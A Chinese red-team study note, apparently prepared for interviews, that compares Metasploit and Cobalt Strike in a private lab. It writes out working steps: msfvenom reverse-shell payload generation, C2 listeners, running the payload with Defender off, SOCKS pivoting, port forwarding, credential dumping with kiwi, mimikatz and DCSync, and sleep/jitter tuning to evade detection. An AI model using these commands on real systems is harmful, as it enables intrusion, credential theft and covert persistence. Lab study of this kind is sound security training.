# 01 - MSF vs CS：C2 工具核心操作对比

## 一、 背景

在红队内网渗透中，C2（Command and Control）工具是核心。主流的两款工具是 **Metasploit Framework（MSF）** 和 **Cobalt Strike（CS）**。

本笔记记录我在本地靶场用 MSF 和 CS 各自跑通的完整流程，以及两者的命令对照，作为面试和实战的参考。

- **测试环境**：
  - 攻击机：Kali（10.0.0.131）
  - 跳板机：Win10 靶机（10.0.0.129）
  - 内网目标：CentOS 7（10.0.0.132）
- **核心概念**：MSF 的 `Meterpreter session` = CS 的 `Beacon`

---

## 二、 核心概念对比

| 维度 | MSF | Cobalt Strike |
| :--- | :--- | :--- |
| **服务端** | `msfconsole` 直接运行 | Team Server（`teamserver`） |
| **客户端** | 同一个 `msfconsole` | 独立的 Java 图形客户端 |
| **会话** | Meterpreter session | Beacon |
| **通信协议** | TCP / HTTP / HTTPS | HTTP / HTTPS / SMB / TCP |
| **交互方式** | 实时（输入→立即输出） | **异步**（默认 Sleep 60s，Jitter 抖动） |
| **隐蔽性** | 中（流量有规律） | 高（流量稀疏、不规则） |
| **Payload 大小** | 较大 | Stager 可小到 19KB |

**关键区别**：Beacon 默认不是长连接，而是**每隔一段时间回连一次**，加上随机抖动（Jitter），让流量看起来像正常业务。这就是 CS 比 MSF 更适合长期隐蔽控制的原因。

---

## 三、 命令对照表

| 操作 | MSF | Cobalt Strike |
| :--- | :--- | :--- |
| **启动服务端** | `msfconsole` | `./teamserver <IP> <密码>` |
| **创建监听** | `use exploit/multi/handler` | Listeners → Add → HTTP/HTTPS |
| **生成 payload** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x LPORT=x -f exe -o shell.exe` | Payloads → Windows Stager Payload |
| **会话查看** | `sessions -l` | 主界面 Sessions 面板 |
| **进入会话** | `sessions -i 1` | 右键 Beacon → Interact |
| **执行命令** | `shell whoami` | `shell whoami` |
| **文件上传** | `upload /local/file C:\path` | `upload /local/file C:\path` |
| **文件下载** | `download C:\path` | `download C:\path` |
| **进程迁移** | `migrate -N explorer.exe` | `inject <pid> x64 <listener>` |
| **Socks 代理** | `use auxiliary/server/socks_proxy` + `run -j` | `socks 1080` |
| **端口转发** | `portfwd add -l 8080 -p 22 -r 10.0.0.132` | `rportfwd 8080 10.0.0.132 22` |
| **调整心跳** | 无（实时） | `sleep 5 20`（5秒心跳，20% 抖动） |
| **查看权限** | `getuid` | `whoami` |
| **抓密码** | `load kiwi` + `creds_all` | `mimikatz` 或 `hashdump` |

---

## 四、 实战流程（以 Socks 代理 + 端口转发为例）

### 4.1 MSF 流程

**第一步：生成 Payload**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.131 LPORT=4444 -f exe -o /tmp/shell.exe
```

**第二步：开启监听**
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.131
set LPORT 4444
exploit -j
```

**第三步：靶机执行 Payload，上线**
```
[*] Meterpreter session 1 opened (10.0.0.131:4444 -> 10.0.0.129:xxxxx)
```

**第四步：Socks 代理**
```bash
background
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j
```

**第五步：Kali 上配置 proxychains**
```bash
# /etc/proxychains4.conf 末尾加
socks5 127.0.0.1 1080
```

**第六步：通过代理扫描内网**
```bash
proxychains nmap -sT -Pn 10.0.0.132
# 结果：22/tcp ssh, 3306/tcp mysql
```

**第七步：端口转发**
```bash
sessions -i 1
portfwd add -l 8080 -p 22 -r 10.0.0.132
```

**第八步：验证端口转发**
```bash
nc -v 127.0.0.1 8080
# localhost [127.0.0.1] 8080 (http-alt) open
```

---

### 4.2 CS 流程

**第一步：启动 Team Server**
```bash
cd ~/tools/cs/CobaltStrike-4.9.1/Server
sudo ./teamserver 10.0.0.131 123456
```

**第二步：Windows 启动客户端连接**
- 双击 `cobaltstrike-client.cmd`
- Host: `10.0.0.131`, Port: `50050`, Password: `123456`

**第三步：创建 Listener**
- Cobalt Strike → Listeners → Add
- Name: `test-http`
- Payload: `windows/beacon_http/reverse_http`
- Host: `10.0.0.131`, Port: `8080`

**第四步：生成 Payload**
- Payloads → Windows Stager Payload
- Listener: `test-http`
- Output: `Windows EXE`, 勾选 x64
- 保存为 `beacon.exe`

**第五步：靶机关闭 Defender，执行 beacon.exe，上线**
```
[*] initial beacon from test@10.0.0.129 (DESKTOP-6O9K55F)
```

**第六步：调整心跳**
```
beacon> sleep 5
```

**第七步：执行命令**
```
beacon> shell whoami
[+] received output: desktop-6o9k55f\test
```

**第八步：Socks 代理**
```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```

**第九步：通过代理扫描内网**
```bash
proxychains nmap -sT -Pn 10.0.0.132
# 结果：22/tcp ssh, 3306/tcp mysql
```

**第十步：端口转发**
```
beacon> rportfwd 8080 10.0.0.132 22
[+] started reverse port forward on 8080 to 10.0.0.132:22
```

**第十一步：验证端口转发**
```bash
nc -v 127.0.0.1 8080
# localhost [127.0.0.1] 8080 (http-alt) open
```

---

## 五、 Beacon 的异步机制（重点）

**Beacon 和 Meterpreter 最核心的区别**：Beacon 默认是**异步**的，不是实时交互。

### 5.1 Sleep 和 Jitter

- **Sleep**：Beacon 每隔多少秒回连一次 CS 服务端。默认 60 秒。
- **Jitter**：在 Sleep 基础上加随机偏移，防止流量规律被识别。默认 0%。

**举例**：`sleep 60 20` 表示 Beacon 每 60±20% 秒（即 48~72 秒）回连一次。

### 5.2 为什么这么设计？

| 原因 | 说明 |
| :--- | :--- |
| **隐蔽** | 长连接容易被防火墙/IDS 发现 |
| **抗溯源** | 流量稀疏、不规则，难以被识别为 C2 |
| **持久** | 即使网络抖动，Beacon 也会重连 |
| **降低带宽消耗** | 命令排队，下次回连时统一发送 |

### 5.3 实战中的权衡

- **隐蔽优先**：`sleep 300 30`（5 分钟心跳，30% 抖动），适合长期潜伏
- **效率优先**：`sleep 5`（5 秒心跳），适合快速渗透

**sleep重点**：
> "Beacon 默认 Sleep 60 秒、Jitter 0%，非常隐蔽但响应慢。实战中我会根据场景调整：需要隐蔽时用 `sleep 300 30`，需要快速渗透时用 `sleep 5`。"

---

## 六、 要点总结

### 6.1 "CS 常用功能有哪些？"
> "CS 核心是 Beacon。常用功能包括：会话控制（shell 命令、upload/download、进程迁移）、Socks 代理（socks 1080 + proxychains）、端口转发（rportfwd）、横向移动（配合 mimikatz 抓密码、DCSync 导出域控哈希）、权限维持（进程迁移到 svchost 或 explorer）。"

### 6.2 "CS 和 MSF 的区别？"
> "最大区别是 Beacon 是异步的，默认 Sleep+Jitter 隐蔽性更强；MSF 的 Meterpreter 是实时的，适合快速验证。CS 还有团队协作功能，多人可共享会话，MSF 更偏单机。命令层面，两者一一对应：socks 1080 = auxiliary/server/socks_proxy，rportfwd 8080 ip port = portfwd add -l 8080 -p port -r ip。"

### 6.3 "多级代理怎么搭？"
> "先上线跳板机 Beacon，用 socks 1080 建立 SOCKS 代理，配合 proxychains 扫内网。如果内网更深，就在下一跳机器上用 frp/chisel 再建一层代理，形成多级链路。如果只需要访问单个服务，用 rportfwd 把内网端口映射到 CS 服务器，本地直接访问。"
